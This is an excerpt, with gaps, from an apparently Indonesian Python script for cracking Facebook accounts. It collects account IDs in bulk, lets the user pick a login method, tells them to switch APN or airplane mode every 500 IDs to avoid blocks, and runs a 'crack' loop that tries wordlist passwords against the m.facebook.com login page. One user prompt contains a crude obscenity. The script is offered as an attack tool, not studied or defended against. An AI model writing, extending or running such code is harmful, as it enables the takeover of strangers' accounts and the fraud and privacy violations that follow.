...
def dump_massal():
	...
	try:
		print('')
		print(f'{k}berhasil terkumpul{b}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{u}')
...
def setting():
	...
	#print('>> 1. B-api (di sarankan)')
	#print('>> 2. Mbasic ')
	print('')
	print('1→METODE MOBIL\n2→METODE MOTOR(OF)')
	hc = input('pilih: ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2']:
		print('→GW DAH BILANG METODE OF KONTOL😒')
		setting()
#	elif hc in ['','']:
#		method.append('free')
#	elif hc in ['','']:
#		method.append('touch')
		...
		method.append('mobile')
	print('')
	_jembot_ = input('MASUKAN PASOWRD SCRIPT→ ')
	if _jembot_ in ['y']:
		print('>> pasowrd salah ')
		back()
	elif _jembot_ in ['ridwan','RIDWAN']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
		os.system('clear')
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	cetak(nel('[bold green]  GANTI GANTI APN/MODPES SETIAP 500ID [bold green]')) 
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{P}[{k}{loop}{P}/{x}{len(id)}{P}{P}/{x}{ok}{P}\{P}{x}{cp}{x}\{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			p = ses.get('https://m.facebook.com/login.php?next=https%3A%2F%2Fm.facebook.com%2Fcampaign%2Flanding.php%3F%26campaign_id%3D1661741489%26extra_1%3Ds%257Cm%257C513502597352%257Ce%257Cfb%257C%26placement%26creative%3D513502597352%26keyword%3Dfb%26partner_id%3Dgooglesem%26extra_2%3Dcampaignid%253D1661741489%2526adgroupid%253D65609010858%2526matchtype%253De%2526network%253Dg%2526source%253Dmobile%2526search_or_content%253Ds%2526device%253Dm%2526devicemodel%253D%2526adposition%253D%2526target%253D%2526targetid%253Dkwd-143742855%2526loc_physical_ms%253D20438%2526loc_interest_ms%253D%2526feeditemid%253D%2526param1%253D%2526param2%253D%26gclid%3DEAIaIQobChMIkf2moID5-QIVrZNmAh3QTweLEAAYASAAEgIE3_D_BwE&refsrc=deprecated&_rdr')
